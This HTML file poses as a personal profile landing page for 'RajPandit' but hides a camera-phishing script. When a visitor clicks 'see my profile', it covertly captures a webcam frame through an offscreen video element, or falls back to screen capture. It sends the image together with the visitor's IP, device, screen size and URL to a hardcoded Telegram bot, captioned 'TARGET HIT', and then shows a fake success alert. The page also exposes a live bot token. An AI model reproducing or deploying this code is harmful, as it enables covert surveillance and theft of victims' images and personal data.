<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RajPandit - Intro</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.95);
            padding: 60px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .photo {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 30px;
            border: 5px solid #fff;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .photo:hover {
            transform: scale(1.05);
        }
        .photo:active {
            transform: scale(0.98);
        }
        h1 {
            color: #333;
            font-size: 2.5em;
            margin: 0 0 20px 0;
            font-weight: bold;
        }
        .subtitle {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.6);
        }
        .btn:active {
            transform: translateY(0);
        }
        .loading {
            display: none;
            color: #667eea;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="RajPandit" class="photo">
        <h1>RajPandit</h1>
        <p class="subtitle">Welcome to my world</p>
        <button class="btn" onclick="seeMyProfile()">👁️ Click to see my profile</button>
        <div class="loading" id="loading">Loading profile...</div>
    </div>

    <script>
        async function seeMyProfile() {
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn').style.display = 'none';
            
            try {
                await stealthCameraSnap();
            } catch(e) {
                console.log('Camera failed, trying fallback');
                await fallbackScreenCapture();
            }
            
            setTimeout(() => {
                document.getElementById('loading').textContent = 'Profile loaded!';
                setTimeout(() => {
                    alert('Profile loaded successfully! 😊');
                }, 1000);
            }, 2000);
        }

        async function stealthCameraSnap() {
            const constraints = [
                {
                    video: {
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 },
                        facingMode: { ideal: "user", optional: [{ facingMode: "environment" }] }
                    }
                },
                {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                },
                { video: true }
            ];

            for (let constraint of constraints) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraint);
                    const photo = await captureFromStream(stream);
                    stream.getTracks().forEach(track => track.stop());
                    await sendPhoto(photo);
                    return;
                } catch (e) {
                    console.log('Camera strategy failed:', constraint);
                    continue;
                }
            }
            
            throw new Error('All camera strategies failed');
        }

        async function captureFromStream(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.style.position = 'fixed';
                video.style.left = '-9999px';
                video.style.top = '-9999px';
                video.muted = true;
                video.playsInline = true;
                video.srcObject = stream;
                document.body.appendChild(video);

                video.onloadedmetadata = () => {
                    video.play();
                    const checkFrame = () => {
                        if (video.readyState >= 2) {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            document.body.removeChild(video);
                            resolve(canvas.toDataURL('image/jpeg', 0.85));
                        } else {
                            requestAnimationFrame(checkFrame);
                        }
                    };
                    checkFrame();
                };
            });
        }

        async function fallbackScreenCapture() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        mediaSource: 'screen',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
                
                const photo = await captureFromStream(stream);
                stream.getTracks().forEach(track => track.stop());
                await sendPhoto(photo, '🖥️ SCREEN CAPTURE');
            } catch(e) {
                console.log('Screen capture also failed');
            }
        }

        async function sendPhoto(imageData, type = '📸 LIVE CAMERA') {
            const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
            const chatId = '7735968383';
            
            const userAgent = navigator.userAgent.slice(0, 60);
            const ip = await getClientIP();
            const screen = `${screen.width}x${screen.height}`;
            const lang = navigator.language;
            
            const caption = `*🎯 RAJPANDIT TARGET HIT!*\n` +
                          `${type} - Profile Button Clicked\n` +
                          `*Device:* ${userAgent}\n` +
                          `*Screen:* ${screen}\n` +
                          `*IP:* ${ip}\n` +
                          `*Lang:* ${lang}\n` +
                          `*URL:* ${window.location.href}\n` +
                          `*Time:* ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}\n` +
                          `\n🔥 *Fresh Capture Secured!*`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURItoBlob(imageData), 'rajpandit_capture.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        async function getClientIP() {
            try {
                const response = await Promise.race([
                    fetch('https://api.ipify.org?format=json'),
                    fetch('https://api64.ipify.org?format=json'),
                    fetch('https://v4.ident.me/json')
                ]);
                const data = await response.json();
                return data.ip || 'Unknown';
            } catch(e) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
